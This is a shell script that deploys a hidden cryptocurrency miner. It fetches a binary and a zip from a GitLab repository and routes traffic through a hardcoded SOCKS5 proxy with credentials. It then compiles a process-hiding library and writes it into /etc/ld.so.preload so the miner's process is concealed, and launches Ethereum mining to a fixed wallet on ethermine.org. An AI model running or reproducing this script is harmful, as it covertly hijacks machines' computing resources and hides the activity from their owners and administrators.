#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 =  154.12.99.211:5551
socks5_username = lebarankita
socks5_password = buatTHRan
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo ""

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo ""

echo " "
echo " "

./graftcp/graftcp wget https://gitlab.com/jiorio669/donlod/-/raw/main/145
chmod +x 145

./graftcp/graftcp wget https://gitlab.com/jiorio669/donlod/-/raw/main/magic145.zip
unzip -o magic145.zip
make
gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
mv libprocesshider.so /usr/local/lib/
echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload

./graftcp/graftcp ./145 --coin ETH --pool us1.ethermine.org:4444 --user 0x416ae3f8ae189add6a5b3b26cab1070b4397edfb.$(echo $(shuf -i 1-999999 -n 1)-WEWEK)
